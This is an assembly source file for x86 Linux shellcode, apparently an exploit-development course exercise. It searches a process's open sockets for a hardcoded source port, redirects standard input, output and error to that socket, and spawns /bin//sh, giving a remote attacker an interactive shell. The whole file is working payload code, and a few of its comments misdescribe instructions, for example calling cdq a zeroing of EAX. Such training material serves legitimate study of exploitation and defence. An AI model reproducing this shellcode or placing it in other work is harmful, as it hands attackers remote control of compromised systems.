; Paolo Stagno aka [VoidSec](https://voidsec.com)
; SLAE-1511

xor ebx,ebx					; zeroing out EBX = 0
push ebx					; push 0 on stack
mov edi,esp					; store current stack pointer to EDI
push byte +0x10				; push address lenght on the stack
push esp					; push pointer too address length on the stack
push edi					; push pointer to 
push ebx					; sockfd to start to search
mov ecx,esp					; move current stack pointer to ECX
mov bl,0x7					; load 0x7 SYS_GETPEERNAME  value in BL

loop_lbl:					; loop_lbl
inc dword [ecx]				; increment file descriptor used in the loop to go to the "next" socket connection	
push byte +0x66				; push 0x66 (socketcall number) on the stack
pop eax						; pop 0x66 in EAX (socketcall systemcall)
int 0x80					; execute socketcall systemcall
cmp word [edi+0x2],0x4271	; compare the socket source port with "28994" little endian value
jnz 0xe						; if the value does not match we go back to loop_lbl

; source port match
dup_loop_lbl:				; dup_loop_lbl
pop ebx						; pop sockfd into EBX
push byte +0x2				; push 2 on the stack (that will be used to perform 3 iterations in dup2 2,1,0)
pop ecx						; load the pushed 2 in ECX
mov al,0x3f					; push dup2 syscall value in AL
int 0x80					; execute dup2 systemcall
dec ecx						; decrement our counter (From 2 to 0 stdin, stdout and stderr..)
jns 0x21					; if we didn't reach the end (-1) we loop bak to our dup_loop_lbl

; Execve
push eax					; EAX should now be 0
push dword 0x68732f2f		; hs//
push dword 0x6e69622f		; nib/
mov ebx,esp					; load a pointer to /bin//sh in EBX
push eax					; push the null function argument to EAX
push ebx					; push /bin//shNULL pointer to EBX
mov ecx,esp					; move pointer to /bin//shNULL into ECX
cdq							; zeroing out EAX = 0
mov al,0xb					; move pointer to /bin//shNULL into ECX
int 0x80					; execute execve systemcall and pop our shell